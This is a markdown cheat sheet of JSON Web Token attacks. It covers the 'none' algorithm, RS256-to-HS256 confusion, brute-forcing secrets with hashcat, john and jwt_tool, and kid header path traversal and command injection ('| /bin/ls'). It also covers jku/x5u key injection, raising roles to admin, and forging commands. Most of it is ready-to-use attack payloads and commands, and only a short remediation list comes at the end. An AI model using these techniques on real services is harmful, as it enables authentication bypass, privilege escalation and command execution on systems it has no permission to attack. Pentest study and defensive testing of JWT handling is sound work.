# JWT Attack — Complete Guide

## 1. Structure

```
Header.Payload.Signature
(base64url).(base64url).(base64url)
```

### Decode
```python
import base64, json
token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.xxx"
header, payload, sig = token.split(".")
print(json.loads(base64.urlsafe_b64decode(header + "==")))
print(json.loads(base64.urlsafe_b64decode(payload + "==")))
```

## 2. Attacks

### 2.1 Algorithm None
```
Original: {"alg":"HS256","typ":"JWT"}
Modified: {"alg":"none","typ":"JWT"}
Remove signature: header.payload.
```

### 2.2 Algorithm Confusion (RSA → HMAC)
```
1. Get RSA public key
2. Change alg from RS256 to HS256
3. Sign JWT with RSA public key as HMAC secret
```

### 2.3 Weak Secret Brute Force
```bash
hashcat -m 16500 jwt.txt wordlist.txt
john --wordlist=wordlist.txt jwt.txt
python3 jwt_tool.py JWT_HERE -C -d wordlist.txt
```

Common secrets: secret, password, 123456, jwt_secret, changeme, admin, key, test

### 2.4 kid Injection
```json
{"kid":"../../../../dev/null","typ":"JWT","alg":"HS256"}
→ Sign with empty string

{"kid":"| /bin/ls","typ":"JWT","alg":"HS256"}
→ Command injection via kid
```

### 2.5 jku/x5u Injection
```
1. Generate RSA key pair
2. Create JWKS endpoint with your public key
3. Set 'jku' header to your JWKS URL
4. Sign JWT with your private key
```

### 2.6 Claim Manipulation
```
Change "role": "user" to "role": "admin"
Change "isAdmin": false to "isAdmin": true
Change "sub": "user_id" to target user ID
Change "exp" to far future timestamp
```

## 3. Tools

### jwt_tool
```bash
# Decode
python3 jwt_tool.py JWT_HERE

# Test alg:none
python3 jwt_tool.py JWT_HERE -X a

# Brute force secret
python3 jwt_tool.py JWT_HERE -C -d wordlist.txt

# Forge with known secret
python3 jwt_tool.py JWT_HERE -S hs256 -p "secret" -I -pc role -pv admin
```

### hashcat
```bash
# Brute force HS256
hashcat -m 16500 jwt.txt wordlist.txt
```

## 4. Remediation

1. **Explicitly specify algorithm** — Don't allow client to choose
2. **Use strong secrets** — 256-bit minimum for HS256
3. **Validate all claims** — exp, iat, nbf, iss, aud
4. **Use asymmetric algorithms** — RS256/ES256 instead of HS256
5. **Rotate keys regularly**
